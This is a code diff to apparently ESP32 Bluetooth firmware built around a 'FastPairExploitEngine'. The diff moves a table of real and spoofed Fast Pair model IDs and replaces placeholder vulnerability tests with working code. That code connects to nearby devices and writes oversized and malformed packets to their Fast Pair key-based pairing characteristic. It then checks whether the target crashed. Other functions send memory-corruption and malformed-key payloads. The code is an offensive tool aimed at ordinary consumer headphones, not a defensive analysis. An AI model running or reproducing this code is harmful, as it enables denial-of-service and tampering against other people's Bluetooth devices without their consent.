@@ -22,6 +22,47 @@ std::vector<NimBLEClient*> BLEStateManager::activeClients;
 String BLEStateManager::currentDeviceName = "";
 
 //=============================================================================
+// FastPair Struct Definitions
+//=============================================================================
+
+struct FastPairModelInfo {
+    uint32_t modelId;
+    const char* name;
+    const char* deviceType;
+};
+
+struct FastPairDeviceInfo {
+    NimBLEAddress address;
+    String name;
+    int rssi;
+    bool supportsFastPair;
+    bool connected;
+    uint32_t modelId;
+    String deviceType;
+};
+
+//=============================================================================
+// FastPair Model Information
+//=============================================================================
+
+const FastPairModelInfo fastpair_models[] = {
+    {0x000047, "Pixel Buds Pro", "Headphones"},
+    {0x000048, "Pixel Buds A-Series", "Headphones"},
+    {0x00000A, "Galaxy Buds Live", "Headphones"},
+    {0x0000F0, "Galaxy Buds2", "Headphones"},
+    {0x000006, "AirPods Pro", "Headphones"},
+    {0xF00100, "Fun Device 1", "Fun"},
+    {0xF00101, "Fun Device 2", "Fun"},
+    {0xF00103, "Fun Device 3", "Fun"},
+    {0xF00104, "Fun Device 4", "Fun"},
+    {0xF00105, "Fun Device 5", "Fun"},
+    {0xF01011, "Prank Device 1", "Prank"},
+    {0xF38C02, "Prank Device 2", "Prank"},
+    {0xF00106, "Prank Device 3", "Prank"},
+    {0, nullptr, nullptr}
+};
+
+//=============================================================================
 // BLE State Manager Implementation
 //=============================================================================
 
@@ -104,27 +145,6 @@ bool isBLEInitialized() {
            NimBLEDevice::getScan() != nullptr || 
            NimBLEDevice::getServer() != nullptr;
 }
-
-//=============================================================================
-// FastPair Model Information
-//=============================================================================
-
-const FastPairModelInfo fastpair_models[] = {
-    {0x000047, "Pixel Buds Pro", "Headphones"},
-    {0x000048, "Pixel Buds A-Series", "Headphones"},
-    {0x00000A, "Galaxy Buds Live", "Headphones"},
-    {0x0000F0, "Galaxy Buds2", "Headphones"},
-    {0x000006, "AirPods Pro", "Headphones"},
-    {0xF00100, "Fun Device 1", "Fun"},
-    {0xF00101, "Fun Device 2", "Fun"},
-    {0xF00103, "Fun Device 3", "Fun"},
-    {0xF00104, "Fun Device 4", "Fun"},
-    {0xF00105, "Fun Device 5", "Fun"},
-    {0xF01011, "Prank Device 1", "Prank"},
-    {0xF38C02, "Prank Device 2", "Prank"},
-    {0xF00106, "Prank Device 3", "Prank"},
-    {0, nullptr, nullptr}
-};
 
 //=============================================================================
 // FastPair Exploit Engine Class Declaration
@@ -3374,18 +3394,30 @@ bool FastPairExploitEngine::testVulnerability(NimBLEAddress target) {
     showAttackProgress("Testing FastPair vulnerability...", TFT_CYAN);
     
     bool vulnerable = false;
-    vulnerable |= testServiceDiscovery(target);
-    vulnerable |= testCharacteristicAccess(target);
-    vulnerable |= testBufferOverflow(target);
-    vulnerable |= testStateConfusion(target);
+    
+    // Test service discovery
+    bool hasService = testServiceDiscovery(target);
+    vulnerable |= hasService;
+    
+    // Test characteristic access
+    bool hasAccess = testCharacteristicAccess(target);
+    vulnerable |= hasAccess;
+    
+    // Test buffer overflow
+    bool overflowPossible = testBufferOverflow(target);
+    vulnerable |= overflowPossible;
+    
+    // Test state confusion
+    bool stateConfused = testStateConfusion(target);
+    vulnerable |= stateConfused;
     
     std::vector<String> results;
     results.push_back("FASTPAIR VULNERABILITY TEST");
     results.push_back("Target: " + String(target.toString().c_str()));
-    results.push_back("Service Discovery: " + String(testServiceDiscovery(target) ? "VULNERABLE" : "SAFE"));
-    results.push_back("Characteristic Access: " + String(testCharacteristicAccess(target) ? "VULNERABLE" : "SAFE"));
-    results.push_back("Buffer Overflow: " + String(testBufferOverflow(target) ? "VULNERABLE" : "SAFE"));
-    results.push_back("State Confusion: " + String(testStateConfusion(target) ? "VULNERABLE" : "SAFE"));
+    results.push_back("Service Discovery: " + String(hasService ? "VULNERABLE" : "SAFE"));
+    results.push_back("Characteristic Access: " + String(hasAccess ? "VULNERABLE" : "SAFE"));
+    results.push_back("Buffer Overflow: " + String(overflowPossible ? "VULNERABLE" : "SAFE"));
+    results.push_back("State Confusion: " + String(stateConfused ? "VULNERABLE" : "SAFE"));
     results.push_back("");
     results.push_back("Overall: " + String(vulnerable ? "VULNERABLE" : "SAFE"));
     
@@ -3436,7 +3468,9 @@ bool FastPairExploitEngine::executeMemoryCorruption(NimBLERemoteCharacteristic* 
         overflowPacket[i] = i % 256;
     }
     
-    return pChar->writeValue(overflowPacket, sizeof(overflowPacket), true);
+    bool result = pChar->writeValue(overflowPacket, sizeof(overflowPacket), true);
+    delay(100);
+    return result;
 }
 
 bool FastPairExploitEngine::executeStateConfusion(NimBLERemoteCharacteristic* pChar) {
@@ -3472,7 +3506,9 @@ bool FastPairExploitEngine::executeCryptoOverflow(NimBLERemoteCharacteristic* pC
         malformedKey[i] = (i % 2 == 0) ? 0xFF : 0x00;
     }
     
-    return pChar->writeValue(malformedKey, sizeof(malformedKey), true);
+    bool result = pChar->writeValue(malformedKey, sizeof(malformedKey), true);
+    delay(100);
+    return result;
 }
 
 bool FastPairExploitEngine::executeHandshakeFault(NimBLERemoteCharacteristic* pChar) {
@@ -3616,6 +3652,10 @@ bool FastPairExploitEngine::testServiceDiscovery(NimBLEAddress target) {
     bool hasService = (pService != nullptr);
     
     pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
+    bleManager.cleanupAfterAttack();
+    
     return hasService;
 }
 
@@ -3633,6 +3673,9 @@ bool FastPairExploitEngine::testCharacteristicAccess(NimBLEAddress target) {
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+        bleManager.cleanupAfterAttack();
         return false;
     }
     
@@ -3640,17 +3683,121 @@ bool FastPairExploitEngine::testCharacteristicAccess(NimBLEAddress target) {
     bool hasAccess = (pChar != nullptr && pChar->canWrite());
     
     pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
+    bleManager.cleanupAfterAttack();
+    
     return hasAccess;
 }
 
 bool FastPairExploitEngine::testBufferOverflow(NimBLEAddress target) {
-    // Placeholder - actual test would send small overflow and check response
-    return false;
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+    
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    NimBLEClient* pClient = nullptr;
+    if(!bleManager.connectToDevice(target, &pClient, true)) {
+        return false;
+    }
+    
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+        bleManager.cleanupAfterAttack();
+        return false;
+    }
+    
+    NimBLERemoteCharacteristic* pChar = findKBPCharacteristic(pService);
+    if(!pChar) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+        bleManager.cleanupAfterAttack();
+        return false;
+    }
+    
+    // Send a small overflow test packet
+    uint8_t testPacket[128];
+    memset(testPacket, 0x41, sizeof(testPacket));
+    testPacket[0] = 0x00;
+    testPacket[1] = 0x00;
+    
+    bool sent = pChar->writeValue(testPacket, sizeof(testPacket), true);
+    
+    // Check if device is still responsive
+    bool crashed = false;
+    try {
+        std::string response = pChar->readValue();
+        crashed = (response.length() == 0);
+    } catch(...) {
+        crashed = true;
+    }
+    
+    pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
+    bleManager.cleanupAfterAttack();
+    
+    return sent && crashed;
 }
 
 bool FastPairExploitEngine::testStateConfusion(NimBLEAddress target) {
-    // Placeholder - actual test would try invalid states
-    return false;
+    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
+    
+    BLEAttackManager bleManager;
+    bleManager.prepareForConnection();
+    
+    NimBLEClient* pClient = nullptr;
+    if(!bleManager.connectToDevice(target, &pClient, true)) {
+        return false;
+    }
+    
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+    if(!pService) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+        bleManager.cleanupAfterAttack();
+        return false;
+    }
+    
+    NimBLERemoteCharacteristic* pChar = findKBPCharacteristic(pService);
+    if(!pChar) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+        bleManager.cleanupAfterAttack();
+        return false;
+    }
+    
+    // Send invalid state packets
+    bool anyConfused = false;
+    uint8_t invalidPacket[10] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    
+    for(int i = 0; i < 5; i++) {
+        bool sent = pChar->writeValue(invalidPacket, sizeof(invalidPacket), true);
+        if(sent) anyConfused = true;
+        delay(50);
+    }
+    
+    // Check if device is still responsive
+    bool crashed = false;
+    try {
+        std::string response = pChar->readValue();
+        crashed = (response.length() == 0);
+    } catch(...) {
+        crashed = true;
+    }
+    
+    pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
+    bleManager.cleanupAfterAttack();
+    
+    return anyConfused && crashed;
 }
 
 void FastPairExploitEngine::logExploitResult(NimBLEAddress target, FastPairExploitType type, bool success) {
